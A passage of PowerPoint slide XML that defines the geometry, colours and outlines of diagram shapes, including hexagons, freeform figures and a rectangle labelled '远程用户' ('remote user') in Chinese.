                    <a:gd name="adj" fmla="val 29000"/>
                    <a:gd name="vf" fmla="val 115470"/>
                  </a:avLst>
                </a:prstGeom>
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:ln w="6350">
                  <a:solidFill>
                    <a:schemeClr val="bg2"/>
                  </a:solidFill>
                  <a:miter lim="800000"/>
                  <a:headEnd/>
                  <a:tailEnd/>
                </a:ln>
              </p:spPr>
              <p:txBody>
                <a:bodyPr rot="10800000" vert="eaVert" wrap="none" anchor="ctr"/>
                <a:lstStyle/>
                <a:p>
                  <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
                </a:p>
              </p:txBody>
            </p:sp>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="98471" name="AutoShape 85"/>
                <p:cNvSpPr>
                  <a:spLocks noChangeArrowheads="1"/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="auto">
                <a:xfrm>
                  <a:off x="2672" y="4664"/>
                  <a:ext cx="116" cy="100"/>
                </a:xfrm>
                <a:prstGeom prst="hexagon">
                  <a:avLst>
                    <a:gd name="adj" fmla="val 29000"/>
                    <a:gd name="vf" fmla="val 115470"/>
                  </a:avLst>
                </a:prstGeom>
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:ln w="6350">
                  <a:solidFill>
                    <a:schemeClr val="bg2"/>
                  </a:solidFill>
                  <a:miter lim="800000"/>
                  <a:headEnd/>
                  <a:tailEnd/>
                </a:ln>
              </p:spPr>
              <p:txBody>
                <a:bodyPr rot="10800000" vert="eaVert" wrap="none" anchor="ctr"/>
                <a:lstStyle/>
                <a:p>
                  <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
                </a:p>
              </p:txBody>
            </p:sp>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="98472" name="AutoShape 86"/>
                <p:cNvSpPr>
                  <a:spLocks noChangeArrowheads="1"/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="auto">
                <a:xfrm>
                  <a:off x="2584" y="4812"/>
                  <a:ext cx="116" cy="100"/>
                </a:xfrm>
                <a:prstGeom prst="hexagon">
                  <a:avLst>
                    <a:gd name="adj" fmla="val 29000"/>
                    <a:gd name="vf" fmla="val 115470"/>
                  </a:avLst>
                </a:prstGeom>
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:ln w="6350">
                  <a:solidFill>
                    <a:schemeClr val="bg2"/>
                  </a:solidFill>
                  <a:miter lim="800000"/>
                  <a:headEnd/>
                  <a:tailEnd/>
                </a:ln>
              </p:spPr>
              <p:txBody>
                <a:bodyPr rot="10800000" vert="eaVert" wrap="none" anchor="ctr"/>
                <a:lstStyle/>
                <a:p>
                  <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
                </a:p>
              </p:txBody>
            </p:sp>
          </p:grpSp>
          <p:grpSp>
            <p:nvGrpSpPr>
              <p:cNvPr id="98457" name="Group 87"/>
              <p:cNvGrpSpPr>
                <a:grpSpLocks/>
              </p:cNvGrpSpPr>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr bwMode="auto">
              <a:xfrm>
                <a:off x="2771" y="2250"/>
                <a:ext cx="88" cy="270"/>
                <a:chOff x="2120" y="4371"/>
                <a:chExt cx="88" cy="360"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="98467" name="Freeform 88"/>
                <p:cNvSpPr>
                  <a:spLocks/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="auto">
                <a:xfrm>
                  <a:off x="2120" y="4371"/>
                  <a:ext cx="88" cy="360"/>
                </a:xfrm>
                <a:custGeom>
                  <a:avLst/>
                  <a:gdLst>
                    <a:gd name="T0" fmla="*/ 0 w 88"/>
                    <a:gd name="T1" fmla="*/ 357 h 360"/>
                    <a:gd name="T2" fmla="*/ 40 w 88"/>
                    <a:gd name="T3" fmla="*/ 0 h 360"/>
                    <a:gd name="T4" fmla="*/ 88 w 88"/>
                    <a:gd name="T5" fmla="*/ 360 h 360"/>
                    <a:gd name="T6" fmla="*/ 0 60000 65536"/>
                    <a:gd name="T7" fmla="*/ 0 60000 65536"/>
                    <a:gd name="T8" fmla="*/ 0 60000 65536"/>
                    <a:gd name="T9" fmla="*/ 0 w 88"/>
                    <a:gd name="T10" fmla="*/ 0 h 360"/>
                    <a:gd name="T11" fmla="*/ 88 w 88"/>
                    <a:gd name="T12" fmla="*/ 360 h 360"/>
                  </a:gdLst>
                  <a:ahLst/>
                  <a:cxnLst>
                    <a:cxn ang="T6">
                      <a:pos x="T0" y="T1"/>
                    </a:cxn>
                    <a:cxn ang="T7">
                      <a:pos x="T2" y="T3"/>
                    </a:cxn>
                    <a:cxn ang="T8">
                      <a:pos x="T4" y="T5"/>
                    </a:cxn>
                  </a:cxnLst>
                  <a:rect l="T9" t="T10" r="T11" b="T12"/>
                  <a:pathLst>
                    <a:path w="88" h="360">
                      <a:moveTo>
                        <a:pt x="0" y="357"/>
                      </a:moveTo>
                      <a:lnTo>
                        <a:pt x="40" y="0"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="88" y="360"/>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468" name="Freeform 89"/>
                <p:cNvSpPr>
                  <a:spLocks/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="auto">
                <a:xfrm>
                  <a:off x="2125" y="4456"/>
                  <a:ext cx="78" cy="232"/>
                </a:xfrm>
                <a:custGeom>
                  <a:avLst/>
                  <a:gdLst>
                    <a:gd name="T0" fmla="*/ 24 w 78"/>
                    <a:gd name="T1" fmla="*/ 0 h 232"/>
                    <a:gd name="T2" fmla="*/ 46 w 78"/>
                    <a:gd name="T3" fmla="*/ 0 h 232"/>
                    <a:gd name="T4" fmla="*/ 22 w 78"/>
                    <a:gd name="T5" fmla="*/ 24 h 232"/>
                    <a:gd name="T6" fmla="*/ 51 w 78"/>
                    <a:gd name="T7" fmla="*/ 24 h 232"/>
                    <a:gd name="T8" fmla="*/ 13 w 78"/>
                    <a:gd name="T9" fmla="*/ 68 h 232"/>
                    <a:gd name="T10" fmla="*/ 59 w 78"/>
                    <a:gd name="T11" fmla="*/ 67 h 232"/>
                    <a:gd name="T12" fmla="*/ 11 w 78"/>
                    <a:gd name="T13" fmla="*/ 115 h 232"/>
                    <a:gd name="T14" fmla="*/ 59 w 78"/>
                    <a:gd name="T15" fmla="*/ 115 h 232"/>
                    <a:gd name="T16" fmla="*/ 9 w 78"/>
                    <a:gd name="T17" fmla="*/ 165 h 232"/>
                    <a:gd name="T18" fmla="*/ 67 w 78"/>
                    <a:gd name="T19" fmla="*/ 165 h 232"/>
                    <a:gd name="T20" fmla="*/ 0 w 78"/>
                    <a:gd name="T21" fmla="*/ 232 h 232"/>
                    <a:gd name="T22" fmla="*/ 78 w 78"/>
                    <a:gd name="T23" fmla="*/ 232 h 2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232"/>
                    <a:gd name="T38" fmla="*/ 78 w 78"/>
                    <a:gd name="T39" fmla="*/ 232 h 2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232">
                      <a:moveTo>
                        <a:pt x="24" y="0"/>
                      </a:moveTo>
                      <a:lnTo>
                        <a:pt x="46" y="0"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="22" y="24"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="51" y="24"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="13" y="68"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="59" y="67"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="11" y="115"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="59" y="115"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="9" y="165"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="67" y="165"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="0" y="232"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="78" y="232"/>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98458" name="Group 90"/>
              <p:cNvGrpSpPr>
                <a:grpSpLocks/>
              </p:cNvGrpSpPr>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr bwMode="auto">
              <a:xfrm>
                <a:off x="2848" y="2320"/>
                <a:ext cx="89" cy="270"/>
                <a:chOff x="2120" y="4371"/>
                <a:chExt cx="88" cy="360"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="98465" name="Freeform 91"/>
                <p:cNvSpPr>
                  <a:spLocks/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="auto">
                <a:xfrm>
                  <a:off x="2120" y="4371"/>
                  <a:ext cx="88" cy="360"/>
                </a:xfrm>
                <a:custGeom>
                  <a:avLst/>
                  <a:gdLst>
                    <a:gd name="T0" fmla="*/ 0 w 88"/>
                    <a:gd name="T1" fmla="*/ 357 h 360"/>
                    <a:gd name="T2" fmla="*/ 40 w 88"/>
                    <a:gd name="T3" fmla="*/ 0 h 360"/>
                    <a:gd name="T4" fmla="*/ 88 w 88"/>
                    <a:gd name="T5" fmla="*/ 360 h 360"/>
                    <a:gd name="T6" fmla="*/ 0 60000 65536"/>
                    <a:gd name="T7" fmla="*/ 0 60000 65536"/>
                    <a:gd name="T8" fmla="*/ 0 60000 65536"/>
                    <a:gd name="T9" fmla="*/ 0 w 88"/>
                    <a:gd name="T10" fmla="*/ 0 h 360"/>
                    <a:gd name="T11" fmla="*/ 88 w 88"/>
                    <a:gd name="T12" fmla="*/ 360 h 360"/>
                  </a:gdLst>
                  <a:ahLst/>
                  <a:cxnLst>
                    <a:cxn ang="T6">
                      <a:pos x="T0" y="T1"/>
                    </a:cxn>
                    <a:cxn ang="T7">
                      <a:pos x="T2" y="T3"/>
                    </a:cxn>
                    <a:cxn ang="T8">
                      <a:pos x="T4" y="T5"/>
                    </a:cxn>
                  </a:cxnLst>
                  <a:rect l="T9" t="T10" r="T11" b="T12"/>
                  <a:pathLst>
                    <a:path w="88" h="360">
                      <a:moveTo>
                        <a:pt x="0" y="357"/>
                      </a:moveTo>
                      <a:lnTo>
                        <a:pt x="40" y="0"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="88" y="360"/>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466" name="Freeform 92"/>
                <p:cNvSpPr>
                  <a:spLocks/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="auto">
                <a:xfrm>
                  <a:off x="2125" y="4456"/>
                  <a:ext cx="78" cy="232"/>
                </a:xfrm>
                <a:custGeom>
                  <a:avLst/>
                  <a:gdLst>
                    <a:gd name="T0" fmla="*/ 24 w 78"/>
                    <a:gd name="T1" fmla="*/ 0 h 232"/>
                    <a:gd name="T2" fmla="*/ 46 w 78"/>
                    <a:gd name="T3" fmla="*/ 0 h 232"/>
                    <a:gd name="T4" fmla="*/ 22 w 78"/>
                    <a:gd name="T5" fmla="*/ 24 h 232"/>
                    <a:gd name="T6" fmla="*/ 51 w 78"/>
                    <a:gd name="T7" fmla="*/ 24 h 232"/>
                    <a:gd name="T8" fmla="*/ 13 w 78"/>
                    <a:gd name="T9" fmla="*/ 68 h 232"/>
                    <a:gd name="T10" fmla="*/ 59 w 78"/>
                    <a:gd name="T11" fmla="*/ 67 h 232"/>
                    <a:gd name="T12" fmla="*/ 11 w 78"/>
                    <a:gd name="T13" fmla="*/ 115 h 232"/>
                    <a:gd name="T14" fmla="*/ 59 w 78"/>
                    <a:gd name="T15" fmla="*/ 115 h 232"/>
                    <a:gd name="T16" fmla="*/ 9 w 78"/>
                    <a:gd name="T17" fmla="*/ 165 h 232"/>
                    <a:gd name="T18" fmla="*/ 67 w 78"/>
                    <a:gd name="T19" fmla="*/ 165 h 232"/>
                    <a:gd name="T20" fmla="*/ 0 w 78"/>
                    <a:gd name="T21" fmla="*/ 232 h 232"/>
                    <a:gd name="T22" fmla="*/ 78 w 78"/>
                    <a:gd name="T23" fmla="*/ 232 h 2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232"/>
                    <a:gd name="T38" fmla="*/ 78 w 78"/>
                    <a:gd name="T39" fmla="*/ 232 h 2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232">
                      <a:moveTo>
                        <a:pt x="24" y="0"/>
                      </a:moveTo>
                      <a:lnTo>
                        <a:pt x="46" y="0"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="22" y="24"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="51" y="24"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="13" y="68"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="59" y="67"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="11" y="115"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="59" y="115"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="9" y="165"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="67" y="165"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="0" y="232"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="78" y="232"/>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98459" name="Group 93"/>
              <p:cNvGrpSpPr>
                <a:grpSpLocks/>
              </p:cNvGrpSpPr>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr bwMode="auto">
              <a:xfrm>
                <a:off x="2929" y="2246"/>
                <a:ext cx="88" cy="270"/>
                <a:chOff x="2120" y="4371"/>
                <a:chExt cx="88" cy="360"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="98463" name="Freeform 94"/>
                <p:cNvSpPr>
                  <a:spLocks/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="auto">
                <a:xfrm>
                  <a:off x="2120" y="4371"/>
                  <a:ext cx="88" cy="360"/>
                </a:xfrm>
                <a:custGeom>
                  <a:avLst/>
                  <a:gdLst>
                    <a:gd name="T0" fmla="*/ 0 w 88"/>
                    <a:gd name="T1" fmla="*/ 357 h 360"/>
                    <a:gd name="T2" fmla="*/ 40 w 88"/>
                    <a:gd name="T3" fmla="*/ 0 h 360"/>
                    <a:gd name="T4" fmla="*/ 88 w 88"/>
                    <a:gd name="T5" fmla="*/ 360 h 360"/>
                    <a:gd name="T6" fmla="*/ 0 60000 65536"/>
                    <a:gd name="T7" fmla="*/ 0 60000 65536"/>
                    <a:gd name="T8" fmla="*/ 0 60000 65536"/>
                    <a:gd name="T9" fmla="*/ 0 w 88"/>
                    <a:gd name="T10" fmla="*/ 0 h 360"/>
                    <a:gd name="T11" fmla="*/ 88 w 88"/>
                    <a:gd name="T12" fmla="*/ 360 h 360"/>
                  </a:gdLst>
                  <a:ahLst/>
                  <a:cxnLst>
                    <a:cxn ang="T6">
                      <a:pos x="T0" y="T1"/>
                    </a:cxn>
                    <a:cxn ang="T7">
                      <a:pos x="T2" y="T3"/>
                    </a:cxn>
                    <a:cxn ang="T8">
                      <a:pos x="T4" y="T5"/>
                    </a:cxn>
                  </a:cxnLst>
                  <a:rect l="T9" t="T10" r="T11" b="T12"/>
                  <a:pathLst>
                    <a:path w="88" h="360">
                      <a:moveTo>
                        <a:pt x="0" y="357"/>
                      </a:moveTo>
                      <a:lnTo>
                        <a:pt x="40" y="0"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="88" y="360"/>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464" name="Freeform 95"/>
                <p:cNvSpPr>
                  <a:spLocks/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="auto">
                <a:xfrm>
                  <a:off x="2125" y="4456"/>
                  <a:ext cx="78" cy="232"/>
                </a:xfrm>
                <a:custGeom>
                  <a:avLst/>
                  <a:gdLst>
                    <a:gd name="T0" fmla="*/ 24 w 78"/>
                    <a:gd name="T1" fmla="*/ 0 h 232"/>
                    <a:gd name="T2" fmla="*/ 46 w 78"/>
                    <a:gd name="T3" fmla="*/ 0 h 232"/>
                    <a:gd name="T4" fmla="*/ 22 w 78"/>
                    <a:gd name="T5" fmla="*/ 24 h 232"/>
                    <a:gd name="T6" fmla="*/ 51 w 78"/>
                    <a:gd name="T7" fmla="*/ 24 h 232"/>
                    <a:gd name="T8" fmla="*/ 13 w 78"/>
                    <a:gd name="T9" fmla="*/ 68 h 232"/>
                    <a:gd name="T10" fmla="*/ 59 w 78"/>
                    <a:gd name="T11" fmla="*/ 67 h 232"/>
                    <a:gd name="T12" fmla="*/ 11 w 78"/>
                    <a:gd name="T13" fmla="*/ 115 h 232"/>
                    <a:gd name="T14" fmla="*/ 59 w 78"/>
                    <a:gd name="T15" fmla="*/ 115 h 232"/>
                    <a:gd name="T16" fmla="*/ 9 w 78"/>
                    <a:gd name="T17" fmla="*/ 165 h 232"/>
                    <a:gd name="T18" fmla="*/ 67 w 78"/>
                    <a:gd name="T19" fmla="*/ 165 h 232"/>
                    <a:gd name="T20" fmla="*/ 0 w 78"/>
                    <a:gd name="T21" fmla="*/ 232 h 232"/>
                    <a:gd name="T22" fmla="*/ 78 w 78"/>
                    <a:gd name="T23" fmla="*/ 232 h 2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232"/>
                    <a:gd name="T38" fmla="*/ 78 w 78"/>
                    <a:gd name="T39" fmla="*/ 232 h 2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232">
                      <a:moveTo>
                        <a:pt x="24" y="0"/>
                      </a:moveTo>
                      <a:lnTo>
                        <a:pt x="46" y="0"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="22" y="24"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="51" y="24"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="13" y="68"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="59" y="67"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="11" y="115"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="59" y="115"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="9" y="165"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="67" y="165"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="0" y="232"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="78" y="232"/>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98460" name="Group 96"/>
              <p:cNvGrpSpPr>
                <a:grpSpLocks/>
              </p:cNvGrpSpPr>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr bwMode="auto">
              <a:xfrm>
                <a:off x="3006" y="2306"/>
                <a:ext cx="89" cy="270"/>
                <a:chOff x="2120" y="4371"/>
                <a:chExt cx="88" cy="360"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="98461" name="Freeform 97"/>
                <p:cNvSpPr>
                  <a:spLocks/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="auto">
                <a:xfrm>
                  <a:off x="2120" y="4371"/>
                  <a:ext cx="88" cy="360"/>
                </a:xfrm>
                <a:custGeom>
                  <a:avLst/>
                  <a:gdLst>
                    <a:gd name="T0" fmla="*/ 0 w 88"/>
                    <a:gd name="T1" fmla="*/ 357 h 360"/>
                    <a:gd name="T2" fmla="*/ 40 w 88"/>
                    <a:gd name="T3" fmla="*/ 0 h 360"/>
                    <a:gd name="T4" fmla="*/ 88 w 88"/>
                    <a:gd name="T5" fmla="*/ 360 h 360"/>
                    <a:gd name="T6" fmla="*/ 0 60000 65536"/>
                    <a:gd name="T7" fmla="*/ 0 60000 65536"/>
                    <a:gd name="T8" fmla="*/ 0 60000 65536"/>
                    <a:gd name="T9" fmla="*/ 0 w 88"/>
                    <a:gd name="T10" fmla="*/ 0 h 360"/>
                    <a:gd name="T11" fmla="*/ 88 w 88"/>
                    <a:gd name="T12" fmla="*/ 360 h 360"/>
                  </a:gdLst>
                  <a:ahLst/>
                  <a:cxnLst>
                    <a:cxn ang="T6">
                      <a:pos x="T0" y="T1"/>
                    </a:cxn>
                    <a:cxn ang="T7">
                      <a:pos x="T2" y="T3"/>
                    </a:cxn>
                    <a:cxn ang="T8">
                      <a:pos x="T4" y="T5"/>
                    </a:cxn>
                  </a:cxnLst>
                  <a:rect l="T9" t="T10" r="T11" b="T12"/>
                  <a:pathLst>
                    <a:path w="88" h="360">
                      <a:moveTo>
                        <a:pt x="0" y="357"/>
                      </a:moveTo>
                      <a:lnTo>
                        <a:pt x="40" y="0"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="88" y="360"/>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462" name="Freeform 98"/>
                <p:cNvSpPr>
                  <a:spLocks/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="auto">
                <a:xfrm>
                  <a:off x="2125" y="4456"/>
                  <a:ext cx="78" cy="232"/>
                </a:xfrm>
                <a:custGeom>
                  <a:avLst/>
                  <a:gdLst>
                    <a:gd name="T0" fmla="*/ 24 w 78"/>
                    <a:gd name="T1" fmla="*/ 0 h 232"/>
                    <a:gd name="T2" fmla="*/ 46 w 78"/>
                    <a:gd name="T3" fmla="*/ 0 h 232"/>
                    <a:gd name="T4" fmla="*/ 22 w 78"/>
                    <a:gd name="T5" fmla="*/ 24 h 232"/>
                    <a:gd name="T6" fmla="*/ 51 w 78"/>
                    <a:gd name="T7" fmla="*/ 24 h 232"/>
                    <a:gd name="T8" fmla="*/ 13 w 78"/>
                    <a:gd name="T9" fmla="*/ 68 h 232"/>
                    <a:gd name="T10" fmla="*/ 59 w 78"/>
                    <a:gd name="T11" fmla="*/ 67 h 232"/>
                    <a:gd name="T12" fmla="*/ 11 w 78"/>
                    <a:gd name="T13" fmla="*/ 115 h 232"/>
                    <a:gd name="T14" fmla="*/ 59 w 78"/>
                    <a:gd name="T15" fmla="*/ 115 h 232"/>
                    <a:gd name="T16" fmla="*/ 9 w 78"/>
                    <a:gd name="T17" fmla="*/ 165 h 232"/>
                    <a:gd name="T18" fmla="*/ 67 w 78"/>
                    <a:gd name="T19" fmla="*/ 165 h 232"/>
                    <a:gd name="T20" fmla="*/ 0 w 78"/>
                    <a:gd name="T21" fmla="*/ 232 h 232"/>
                    <a:gd name="T22" fmla="*/ 78 w 78"/>
                    <a:gd name="T23" fmla="*/ 232 h 2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232"/>
                    <a:gd name="T38" fmla="*/ 78 w 78"/>
                    <a:gd name="T39" fmla="*/ 232 h 2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232">
                      <a:moveTo>
                        <a:pt x="24" y="0"/>
                      </a:moveTo>
                      <a:lnTo>
                        <a:pt x="46" y="0"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="22" y="24"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="51" y="24"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="13" y="68"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="59" y="67"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="11" y="115"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="59" y="115"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="9" y="165"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="67" y="165"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="0" y="232"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="78" y="232"/>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98341" name="Rectangle 99"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="427" y="599"/>
              <a:ext cx="1125" cy="602"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="127000" cmpd="dbl">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p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98342" name="AutoShape 100"/>
            <p:cNvSpPr>
              <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1485" y="1028"/>
              <a:ext cx="104" cy="99"/>
            </a:xfrm>
            <a:prstGeom prst="plus">
              <a:avLst>
                <a:gd name="adj" fmla="val 25000"/>
              </a:avLst>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="FF7C80"/>
            </a:solidFill>
            <a:ln w="6350">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="98343" name="Group 101"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="2352" y="818"/>
              <a:ext cx="755" cy="445"/>
              <a:chOff x="2317" y="1111"/>
              <a:chExt cx="755" cy="445"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98446" name="Rectangle 102"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2317" y="1111"/>
                <a:ext cx="755" cy="445"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="00CC99"/>
              </a:solidFill>
              <a:ln w="38100">
                <a:solidFill>
                  <a:srgbClr val="000099"/>
                </a:solidFill>
                <a:miter lim="800000"/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="none" tIns="9144" rIns="27432"/>
              <a:lstStyle/>
              <a:p>
                <a:pPr algn="r" eaLnBrk="0" hangingPunct="0"/>
                <a:r>
                  <a:rPr lang="zh-CN" altLang="en-US" sz="1200" b="1">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>远程用户</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98447" name="Freeform 103"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2372" y="1437"/>
                <a:ext cx="363" cy="114"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 163251 w 287"/>
                  <a:gd name="T1" fmla="*/ 1597 h 95"/>
                  <a:gd name="T2" fmla="*/ 31914 w 287"/>
                  <a:gd name="T3" fmla="*/ 13046 h 95"/>
                  <a:gd name="T4" fmla="*/ 0 w 287"/>
                  <a:gd name="T5" fmla="*/ 2239 h 95"/>
                  <a:gd name="T6" fmla="*/ 0 w 287"/>
                  <a:gd name="T7" fmla="*/ 446 h 95"/>
                  <a:gd name="T8" fmla="*/ 163251 w 287"/>
                  <a:gd name="T9" fmla="*/ 0 h 95"/>
                  <a:gd name="T10" fmla="*/ 163251 w 287"/>
                  <a:gd name="T11" fmla="*/ 1597 h 95"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 w 287"/>
                  <a:gd name="T19" fmla="*/ 0 h 95"/>
                  <a:gd name="T20" fmla="*/ 287 w 287"/>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287" h="95">
                    <a:moveTo>
                      <a:pt x="287" y="12"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="56" y="95"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="12"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98448" name="Freeform 104"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2332" y="1233"/>
                <a:ext cx="230" cy="207"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
